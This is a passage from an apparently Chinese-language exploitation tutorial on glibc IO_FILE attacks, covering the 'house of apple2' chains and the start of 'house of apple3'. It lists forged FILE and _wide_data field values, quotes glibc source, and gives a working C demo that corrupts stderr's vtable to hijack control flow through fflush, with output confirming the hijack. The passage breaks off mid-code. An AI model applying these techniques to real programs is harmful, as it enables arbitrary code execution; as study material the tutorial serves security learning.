B</code></li><li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li></ul><p>函数的调用链如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_underflow_mmap</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure><p>详细分析如下：<br>看<code>_IO_wfile_underflow_mmap</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *read_stop;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end</span><br><span class="line">      <span class="comment">/* No.  But maybe the read buffer is not fully set up.  */</span></span><br><span class="line">      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)</span><br><span class="line">    <span class="comment">/* Nothing available.  _IO_file_underflow_mmap has set the EOF or error</span></span><br><span class="line"><span class="comment">       flags as appropriate.  */</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">  read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_wide_data-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">    &#125;</span><br><span class="line">      _IO_wdoallocbuf (fp);<span class="comment">// 需要走到这里</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要设置<code>fp-&gt;_flags &amp; _IO_NO_READS == 0</code>，设置<code>fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end</code>，设置<code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>不进入调用，设置<code>fp-&gt;_wide_data-&gt;_IO_buf_base == NULL</code>和<code>fp-&gt;_wide_data-&gt;_IO_save_base == NULL</code>。</p><h3 id="利用-IO-wdefault-xsgetn函数控制程序执行流"><a href="#利用-IO-wdefault-xsgetn函数控制程序执行流" class="headerlink" title="利用_IO_wdefault_xsgetn函数控制程序执行流"></a>利用_IO_wdefault_xsgetn函数控制程序执行流</h3><p><strong>这条链执行的条件是调用到_IO_wdefault_xsgetn时rdx寄存器，也就是第三个参数不为0</strong>。如果不满足这个条件，可选用其他链。</p><p>对<code>fp</code>的设置如下：</p><ul><li><code>_flags</code>设置为<code>0x800</code></li><li><code>vtable</code>设置为<code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wdefault_xsgetn</code>即可</li><li><code>_mode</code>设置为大于<code>0</code>，即满足<code>*(fp + 0xc0) &gt; 0</code></li><li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code>设置为<code>0</code>，即满足<code>*(A + 8) = *A</code></li><li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &gt; *(A + 0x18)</code></li><li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li><li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x18) = C</code></li></ul><p>函数的调用链如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_wdefault_xsgetn</span><br><span class="line">    __wunderflow</span><br><span class="line">        _IO_switch_to_wget_mode</span><br><span class="line">            _IO_WOVERFLOW</span><br><span class="line">                *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x18</span>)(fp)</span><br></pre></td></tr></table></figure><p>详细分析如下：<br>首先看<code>_IO_wdefault_xsgetn</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_wdefault_xsgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="type">wchar_t</span> *s = (<span class="type">wchar_t</span>*) data;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Data available. */</span></span><br><span class="line">      <span class="type">ssize_t</span> count = (fp-&gt;_wide_data-&gt;_IO_read_end</span><br><span class="line">                       - fp-&gt;_wide_data-&gt;_IO_read_ptr);</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">size_t</span>) count &gt; more)</span><br><span class="line">        count = more;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          s = __wmempcpy (s, fp-&gt;_wide_data-&gt;_IO_read_ptr, count);</span><br><span class="line">          fp-&gt;_wide_data-&gt;_IO_read_ptr += count;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">        count = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">wchar_t</span> *p = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">          <span class="type">int</span> i = (<span class="type">int</span>) count;</span><br><span class="line">          <span class="keyword">while</span> (--i &gt;= <span class="number">0</span>)</span><br><span class="line">        *s++ = *p++;</span><br><span class="line">          fp-&gt;_wide_data-&gt;_IO_read_ptr = p;</span><br><span class="line">            &#125;</span><br><span class="line">            more -= count;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || __wunderflow (fp) == WEOF)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wdefault_xsgetn)</span><br></pre></td></tr></table></figure><p>由于<code>more</code>是第三个参数，所以不能为<code>0</code>。<br>直接设置<code>fp-&gt;_wide_data-&gt;_IO_read_ptr == fp-&gt;_wide_data-&gt;_IO_read_end</code>，使得<code>count</code>为<code>0</code>，不进入<code>if</code>分支。<br>随后当<code>more != 0</code>时会进入<code>__wunderflow</code>。</p><p>接着看<code>__wunderflow</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">__wunderflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &lt; <span class="number">0</span> || (fp-&gt;_mode == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">1</span>) != <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)</span><br><span class="line">    _IO_fwide (fp, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_put_mode (fp))</span><br><span class="line">    <span class="keyword">if</span> (_IO_switch_to_wget_mode (fp) == EOF)</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要想调用到<code>_IO_switch_to_wget_mode</code>，需要设置<code>fp-&gt;mode &gt; 0</code>，并且<code>fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING != 0</code>。</p><p>然后在<code>_IO_switch_to_wget_mode</code>函数中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF) <span class="comment">// 需要走到这里</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    <span class="comment">// .....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当满足fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base时就会调用_IO_WOVERFLOW(fp)。</p><h2 id="示例-5"><a href="#示例-5" class="headerlink" title="示例"></a>示例</h2><p>以下面提到的<code>_IO_wdefault_xsgetn</code>函数利用为例，编写<code>demo</code>示例如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m[!] Backdoor is called!\n&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span> *p1 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="type">char</span> *p2 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate two 0x200 chunks&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)&amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] puts address: %p\n&quot;</span>, (<span class="type">void</span> *)puts_addr);</span><br><span class="line">    <span class="type">size_t</span> libc_base_addr = puts_addr - <span class="number">0x84420</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libc base address: %p\n&quot;</span>, (<span class="type">void</span> *)libc_base_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> _IO_2_1_stderr_addr = libc_base_addr + <span class="number">0x1ed5c0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_2_1_stderr_ address: %p\n&quot;</span>, (<span class="type">void</span> *)_IO_2_1_stderr_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> _IO_wstrn_jumps_addr = libc_base_addr + <span class="number">0x1e8c60</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wstrn_jumps address: %p\n&quot;</span>, (<span class="type">void</span> *)_IO_wstrn_jumps_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span> *stderr2 = (<span class="type">char</span> *)_IO_2_1_stderr_addr;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: change stderr-&gt;_flags to 0x800&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr2 = <span class="number">0x800</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: change stderr-&gt;_mode to 1&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0xc0</span>) = <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 3: change stderr-&gt;vtable to _IO_wstrn_jumps-0x20&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0xd8</span>) = _IO_wstrn_jumps_addr<span class="number">-0x20</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: replace stderr-&gt;_wide_data with the allocated chunk p1&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0xa0</span>) = (<span class="type">size_t</span>)p1;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: set stderr-&gt;_wide_data-&gt;_wide_vtable with the allocated chunk p2&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(p1 + <span class="number">0xe0</span>) = (<span class="type">size_t</span>)p2;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 6: set stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_ptr &gt;  stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_base&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(p1 + <span class="number">0x20</span>) = (<span class="type">size_t</span>)<span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 7: put backdoor at fake _wide_vtable-&gt;_overflow&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(p2 + <span class="number">0x18</span>) = (<span class="type">size_t</span>)(&amp;backdoor);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 8: call fflush(stderr) to trigger backdoor func&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stderr</span>);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[*] allocate two <span class="number">0x200</span> chunks</span><br><span class="line">[*] <span class="built_in">puts</span> address: <span class="number">0x7f8f73d2e420</span></span><br><span class="line">[*] libc base address: <span class="number">0x7f8f73caa000</span></span><br><span class="line">[*] _IO_2_1_stderr_ address: <span class="number">0x7f8f73e975c0</span></span><br><span class="line">[*] _IO_wstrn_jumps address: <span class="number">0x7f8f73e92c60</span></span><br><span class="line">[+] step <span class="number">1</span>: change <span class="built_in">stderr</span>-&gt;_flags to <span class="number">0x800</span></span><br><span class="line">[+] step <span class="number">2</span>: change <span class="built_in">stderr</span>-&gt;_mode to <span class="number">1</span></span><br><span class="line">[+] step <span class="number">3</span>: change <span class="built_in">stderr</span>-&gt;vtable to _IO_wstrn_jumps<span class="number">-0x20</span></span><br><span class="line">[+] step <span class="number">4</span>: replace <span class="built_in">stderr</span>-&gt;_wide_data with the allocated chunk p1</span><br><span class="line">[+] step <span class="number">5</span>: <span class="built_in">set</span> <span class="built_in">stderr</span>-&gt;_wide_data-&gt;_wide_vtable with the allocated chunk p2</span><br><span class="line">[+] step <span class="number">6</span>: <span class="built_in">set</span> <span class="built_in">stderr</span>-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_ptr &gt;  <span class="built_in">stderr</span>-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_base</span><br><span class="line">[+] step <span class="number">7</span>: put backdoor at fake _wide_vtable-&gt;_overflow</span><br><span class="line">[+] step <span class="number">8</span>: call <span class="title function_">fflush</span><span class="params">(<span class="built_in">stderr</span>)</span> to trigger backdoor func</span><br><span class="line">[!] Backdoor is called!</span><br></pre></td></tr></table></figure><h1 id="house-of-apple3"><a href="#house-of-apple3" class="headerlink" title="house of apple3"></a>house of apple3</h1><h2 id="概要-16"><a href="#概要-16" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong><code>house of apple1</code>中的利用链能<strong>任意地址写堆地址</strong>，<code>house of apple2</code>中的利用链能通过控制<code>FILE</code>结构体的<code>_wide_data</code>成员去<strong>直接控制程序执行流。</strong><code>house of apple3</code>则关注<code>FILE</code>结构体的另外一个成员<code>_codecvt</code>的利用。</p><p><strong>利用条件:</strong></p><ol><li>能控制程序执行<code>IO</code>操作，包括但不限于：从<code>main</code>函数返回、调用<code>exit</code>函数、通过<code>__malloc_assert</code>触发</li><li>能够泄露堆地址和libc基址</li><li>能控制<code>_IO_FILE</code>的<code>vtable</code>和<code>_codecvt</code>，一般使用<code>largebin attack</code>去控制</li></ol><p><strong>利用效果:</strong>控制流</p><p><strong>有效版本:</strong>ALL</p><h2 id="原理-16"><a href="#原理-16" class="headerlink" title="原理"></a>原理</h2><p><code>FILE</code>结构体中有一个成员<code>struct _IO_codecvt *_codecvt;</code>，偏移为<code>0x98</code>。该结构体参与宽字符的转换工作，结构体被定义为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// libio\libio.h:115</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_iconv_t __cd_in;</span><br><span class="line">  _IO_iconv_t __cd_out;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// libio\libio.h:51</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">step</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step_data</span> <span class="title">step_data</span>;</span></span><br><span class="line">&#125; _IO_iconv_t;</span><br></pre></td></tr></table></figure><p>__gconv_step:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// iconv\gconv.h:84</span></span><br><span class="line"><span class="comment">/* Description of a conversion step.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_loaded_object</span> *__<span class="title">shlib_handle</span>;</span><span class="comment">// 关注这个成员</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *__modname;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* For internal use by glibc.  (Accesses to this member must occur</span></span><br><span class="line"><span class="comment">     when the internal __gconv_lock mutex is acquired).  */</span></span><br><span class="line">  <span class="type">int</span> __counter;</span><br><span class="line"> </span><br><span class="line">  <span class="type">char</span> *__from_name;</span><br><span class="line">  <span class="type">char</span> *__to_name;</span><br><span class="line"> </span><br><span class="line">  __gconv_fct __fct;<span class="comment">// 关注这个成员</span></span><br><span class="line">  __gconv_btowc_fct __btowc_fct;</span><br><span class="line">  __gconv_init_fct __init_fct;</span><br><span class="line">  __gconv_end_fct __end_fct;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Information about the number of bytes needed or produced in this</span></span><br><span class="line"><span class="comment">     step.  This helps optimizing the buffer sizes.  */</span></span><br><span class="line">  <span class="type">int</span> __min_needed_from;</span><br><span class="line">  <span class="type">int</span> __max_needed_from;</span><br><span class="line">  <span class="type">int</span> __min_needed_to;</span><br><span class="line">  <span class="type">int</span> __max_needed_to;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Flag whether this is a stateful encoding or not.  */</span></span><br><span class="line">  <span class="type">int</span> __stateful;</span><br><span class="line"> </span><br><span class="line">  <span class="type">void</span> *__data;        <span class="comment">/* Pointer to step-local data.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>__gconv_step_data:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Additional data for steps in use of conversion descriptor.  This is</span></span><br><span class="line"><span class="comment">   allocated by the `init&#x27; function.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *__outbuf;    <span class="comment">/* Output buffer for this step.  */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *__outbufend; <span class="comment">/* Address of first byte after the output</span></span><br><span class="line"><span class="comment">                 buffer.  */</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Is this the last module in the chain.  */</span></span><br><span class="line">  <span class="type">int</span> __flags;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Counter for number of invocations of the module function for this</span></span><br><span class="line"><span class="comment">     descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> __invocation_counter;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Flag whether this is an internal use of the module (in the mb*towc*</span></span><br><span class="line"><span class="comment">     and wc*tomb* functions) or regular with iconv(3).  */</span></span><br><span class="line">  <span class="type">int</span> __internal_use;</span><br><span class="line"> </span><br><span class="line">  <span class="type">__mbstate_t</span> *__statep;</span><br><span class="line">  <span class="type">__mbstate_t</span> __state;    <span class="comment">/* This element must not be used directly by</span></span><br><span class="line"><span class="comment">               any module; always use STATEP!  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>以上两个结构体均会被用于字符转换，而在利用的过程中，需要精准控制结构体中的某些成员，避免引发内存访问错误。</p><p><code>house of apple3</code>的利用主要关注以下三个函数：<code>__libio_codecvt_out</code>、<code>__libio_codecvt_in</code>和<code>__libio_codecvt_length</code>。</p><p>三个函数定义在glibc\libio\iofwide.c</p><p>三个函数的利用点都差不多，以<code>__libio_codecvt_in</code>为例，源码分析如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 